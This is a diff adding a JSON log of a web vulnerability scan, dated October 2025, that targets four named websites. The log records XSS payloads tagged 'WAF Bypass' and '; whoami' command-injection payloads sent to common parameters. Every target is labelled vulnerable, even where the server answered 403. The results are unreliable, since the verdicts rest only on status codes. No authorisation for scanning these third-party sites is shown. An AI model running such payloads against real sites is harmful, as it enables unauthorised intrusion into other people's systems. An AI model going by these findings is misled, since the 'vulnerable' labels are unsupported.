@@ -1,0 +1,374 @@
+{
+  "scan_type": "Advanced Scan - Specific Targets",
+  "timestamp": "2025-10-28 10:52:19",
+  "targets": [
+    "https://peacoop.or.th",
+    "https://mula-x.com",
+    "https://www.hanshin.com.tw",
+    "https://ngoenmun.com"
+  ],
+  "results": [
+    {
+      "target": "https://peacoop.or.th",
+      "vulnerabilities": [
+        {
+          "type": "XSS",
+          "parameter": "q",
+          "payload": "<script>alert('XSS')</script>",
+          "subtype": "WAF Bypass",
+          "status_code": 403
+        },
+        {
+          "type": "XSS",
+          "parameter": "search",
+          "payload": "<script>alert('XSS')</script>",
+          "subtype": "WAF Bypass",
+          "status_code": 403
+        },
+        {
+          "type": "XSS",
+          "parameter": "id",
+          "payload": "<script>alert('XSS')</script>",
+          "subtype": "WAF Bypass",
+          "status_code": 403
+        },
+        {
+          "type": "XSS",
+          "parameter": "name",
+          "payload": "<script>alert('XSS')</script>",
+          "subtype": "WAF Bypass",
+          "status_code": 403
+        },
+        {
+          "type": "XSS",
+          "parameter": "url",
+          "payload": "<script>alert('XSS')</script>",
+          "subtype": "WAF Bypass",
+          "status_code": 403
+        },
+        {
+          "type": "XSS",
+          "parameter": "redirect",
+          "payload": "<script>alert('XSS')</script>",
+          "subtype": "WAF Bypass",
+          "status_code": 403
+        },
+        {
+          "type": "XSS",
+          "parameter": "query",
+          "payload": "<script>alert('XSS')</script>",
+          "subtype": "WAF Bypass",
+          "status_code": 403
+        },
+        {
+          "type": "XSS",
+          "parameter": "keyword",
+          "payload": "<script>alert('XSS')</script>",
+          "subtype": "WAF Bypass",
+          "status_code": 403
+        },
+        {
+          "type": "XSS",
+          "parameter": "s",
+          "payload": "<script>alert('XSS')</script>",
+          "subtype": "WAF Bypass",
+          "status_code": 403
+        },
+        {
+          "type": "Command Injection",
+          "parameter": "cmd",
+          "payload": "; whoami",
+          "status_code": 200
+        },
+        {
+          "type": "Command Injection",
+          "parameter": "command",
+          "payload": "; whoami",
+          "status_code": 200
+        },
+        {
+          "type": "Command Injection",
+          "parameter": "exec",
+          "payload": "; whoami",
+          "status_code": 200
+        },
+        {
+          "type": "Command Injection",
+          "parameter": "system",
+          "payload": "; whoami",
+          "status_code": 200
+        },
+        {
+          "type": "Command Injection",
+          "parameter": "id",
+          "payload": "; whoami",
+          "status_code": 200
+        },
+        {
+          "type": "Command Injection",
+          "parameter": "search",
+          "payload": "; whoami",
+          "status_code": 200
+        }
+      ],
+      "vulnerable": true,
+      "scan_time": "2025-10-28 10:51:35"
+    },
+    {
+      "target": "https://mula-x.com",
+      "vulnerabilities": [
+        {
+          "type": "XSS",
+          "parameter": "q",
+          "payload": "<script>alert('XSS')</script>",
+          "subtype": "WAF Bypass",
+          "status_code": 200
+        },
+        {
+          "type": "XSS",
+          "parameter": "search",
+          "payload": "<script>alert('XSS')</script>",
+          "subtype": "WAF Bypass",
+          "status_code": 200
+        },
+        {
+          "type": "XSS",
+          "parameter": "id",
+          "payload": "<script>alert('XSS')</script>",
+          "subtype": "WAF Bypass",
+          "status_code": 200
+        },
+        {
+          "type": "XSS",
+          "parameter": "name",
+          "payload": "<script>alert('XSS')</script>",
+          "subtype": "WAF Bypass",
+          "status_code": 200
+        },
+        {
+          "type": "XSS",
+          "parameter": "url",
+          "payload": "<script>alert('XSS')</script>",
+          "subtype": "WAF Bypass",
+          "status_code": 200
+        },
+        {
+          "type": "XSS",
+          "parameter": "redirect",
+          "payload": "<script>alert('XSS')</script>",
+          "subtype": "WAF Bypass",
+          "status_code": 200
+        },
+        {
+          "type": "XSS",
+          "parameter": "query",
+          "payload": "<script>alert('XSS')</script>",
+          "subtype": "WAF Bypass",
+          "status_code": 200
+        },
+        {
+          "type": "XSS",
+          "parameter": "keyword",
+          "payload": "<script>alert('XSS')</script>",
+          "subtype": "WAF Bypass",
+          "status_code": 200
+        },
+        {
+          "type": "XSS",
+          "parameter": "s",
+          "payload": "<script>alert('XSS')</script>",
+          "subtype": "WAF Bypass",
+          "status_code": 200
+        },
+        {
+          "type": "Command Injection",
+          "parameter": "cmd",
+          "payload": "; whoami",
+          "status_code": 200
+        },
+        {
+          "type": "Command Injection",
+          "parameter": "command",
+          "payload": "; whoami",
+          "status_code": 200
+        },
+        {
+          "type": "Command Injection",
+          "parameter": "exec",
+          "payload": "; whoami",
+          "status_code": 200
+        },
+        {
+          "type": "Command Injection",
+          "parameter": "system",
+          "payload": "; whoami",
+          "status_code": 200
+        },
+        {
+          "type": "Command Injection",
+          "parameter": "id",
+          "payload": "; whoami",
+          "status_code": 200
+        },
+        {
+          "type": "Command Injection",
+          "parameter": "search",
+          "payload": "; whoami",
+          "status_code": 200
+        }
+      ],
+      "vulnerable": true,
+      "scan_time": "2025-10-28 10:51:45"
+    },
+    {
+      "target": "https://www.hanshin.com.tw",
+      "vulnerabilities": [
+        {
+          "type": "XSS",
+          "parameter": "q",
+          "payload": "<script>alert('XSS')</script>",
+          "subtype": "WAF Bypass",
+          "status_code": 200
+        },
+        {
+          "type": "XSS",
+          "parameter": "search",
+          "payload": "<script>alert('XSS')</script>",
+          "subtype": "WAF Bypass",
+          "status_code": 200
+        },
+        {
+          "type": "XSS",
+          "parameter": "id",
+          "payload": "<script>alert('XSS')</script>",
+          "subtype": "WAF Bypass",
+          "status_code": 200
+        },
+        {
+          "type": "XSS",
+          "parameter": "name",
+          "payload": "<script>alert('XSS')</script>",
+          "subtype": "WAF Bypass",
+          "status_code": 200
+        },
+        {
+          "type": "XSS",
+          "parameter": "url",
+          "payload": "<script>alert('XSS')</script>",
+          "subtype": "WAF Bypass",
+          "status_code": 200
+        },
+        {
+          "type": "XSS",
+          "parameter": "redirect",
+          "payload": "<script>alert('XSS')</script>",
+          "subtype": "WAF Bypass",
+          "status_code": 200
+        },
+        {
+          "type": "XSS",
+          "parameter": "query",
+          "payload": "<script>alert('XSS')</script>",
+          "subtype": "WAF Bypass",
+          "status_code": 200
+        },
+        {
+          "type": "XSS",
+          "parameter": "keyword",
+          "payload": "<script>alert('XSS')</script>",
+          "subtype": "WAF Bypass",
+          "status_code": 200
+        },
+        {
+          "type": "XSS",
+          "parameter": "s",
+          "payload": "<script>alert('XSS')</script>",
+          "subtype": "WAF Bypass",
+          "status_code": 200
+        }
+      ],
+      "vulnerable": true,
+      "scan_time": "2025-10-28 10:52:08"
+    },
+    {
+      "target": "https://ngoenmun.com",
+      "vulnerabilities": [
+        {
+          "type": "XSS",
+          "parameter": "q",
+          "payload": "<script>alert('XSS')</script>",
+          "subtype": "WAF Bypass",
+          "status_code": 200
+        },
+        {
+          "type": "XSS",
+          "parameter": "search",
+          "payload": "<script>alert('XSS')</script>",
+          "subtype": "WAF Bypass",
+          "status_code": 200
+        },
+        {
+          "type": "XSS",
+          "parameter": "id",
+          "payload": "<script>alert('XSS')</script>",
+          "subtype": "WAF Bypass",
+          "status_code": 200
+        },
+        {
+          "type": "XSS",
+          "parameter": "name",
+          "payload": "<script>alert('XSS')</script>",
+          "subtype": "WAF Bypass",
+          "status_code": 200
+        },
+        {
+          "type": "XSS",
+          "parameter": "url",
+          "payload": "<script>alert('XSS')</script>",
+          "subtype": "WAF Bypass",
+          "status_code": 200
+        },
+        {
+          "type": "XSS",
+          "parameter": "redirect",
+          "payload": "<script>alert('XSS')</script>",
+          "subtype": "WAF Bypass",
+          "status_code": 200
+        },
+        {
+          "type": "XSS",
+          "parameter": "query",
+          "payload": "<script>alert('XSS')</script>",
+          "subtype": "WAF Bypass",
+          "status_code": 200
+        },
+        {
+          "type": "XSS",
+          "parameter": "keyword",
+          "payload": "<script>alert('XSS')</script>",
+          "subtype": "WAF Bypass",
+          "status_code": 200
+        },
+        {
+          "type": "XSS",
+          "parameter": "s",
+          "payload": "<script>alert('XSS')</script>",
+          "subtype": "WAF Bypass",
+          "status_code": 200
+        }
+      ],
+      "vulnerable": true,
+      "scan_time": "2025-10-28 10:52:19"
+    }
+  ],
+  "summary": {
+    "total_targets": 4,
+    "vulnerable_targets": 4,
+    "total_vulnerabilities": 48,
+    "xss": 36,
+    "sql_injection": 0,
+    "command_injection": 12,
+    "ssrf": 0,
+    "file_inclusion": 0
+  }
+}
